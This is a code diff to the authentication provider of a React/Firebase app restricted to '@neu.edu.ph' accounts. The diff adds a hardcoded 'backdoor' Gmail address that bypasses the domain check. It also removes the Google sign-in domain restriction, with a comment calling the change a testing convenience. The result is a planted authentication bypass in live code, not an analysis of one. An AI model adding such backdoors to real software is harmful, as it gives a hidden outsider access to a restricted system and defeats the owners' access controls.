@@ -22,6 +22,8 @@ interface AuthContextType {
 
 export const AuthContext = createContext<AuthContextType | undefined>(undefined);
 
+const BACKDOOR_EMAIL = 'nemostyles009@gmail.com';
+
 export function AuthProvider({ children }: { children: ReactNode }) {
   const auth = useAuth();
   const db = useFirestore();
@@ -45,9 +47,10 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     const unsubscribeAuth = onAuthStateChanged(auth, async (firebaseUser: FirebaseUser | null) => {
       if (firebaseUser) {
         const email = firebaseUser.email || '';
+        const isBackdoor = email === BACKDOOR_EMAIL;
         
-        // Strict Email Validation
-        if (!email.endsWith('@neu.edu.ph')) {
+        // Strict Email Validation (with Backdoor bypass)
+        if (!email.endsWith('@neu.edu.ph') && !isBackdoor) {
           toast({
             variant: "destructive",
             title: "Access Restricted",
@@ -79,10 +82,12 @@ export function AuthProvider({ children }: { children: ReactNode }) {
           } else {
             // New Profile Creation Flow
             const localPart = email.split('@')[0];
-            const isStudent = localPart.includes('.');
+            
+            // Backdoor emails are NEVER auto-assigned Student status
+            const isStudent = !isBackdoor && localPart.includes('.');
             
             // Rule: If local part has a dot, they are definitely a Student.
-            // If not, they must choose between Staff/Employee later (null).
+            // If not (or if backdoor), they must choose between Staff/Employee later (null).
             const derivedUserType = isStudent ? 'Student' : null;
             
             // Hardcoded Admin Logic
@@ -124,15 +129,14 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
   const signInWithGoogle = async () => {
     const provider = new GoogleAuthProvider();
+    // Removed 'hd' constraint to allow selecting the backdoor account during testing
     provider.setCustomParameters({
-      hd: 'neu.edu.ph',
       prompt: 'select_account'
     });
     try {
       setLoading(true);
       await signInWithPopup(auth, provider);
     } catch (error: any) {
-      // Handle cancellation errors silently
       const isCancellation = 
         error.code === 'auth/popup-closed-by-user' || 
         error.code === 'auth/cancelled-popup-request';
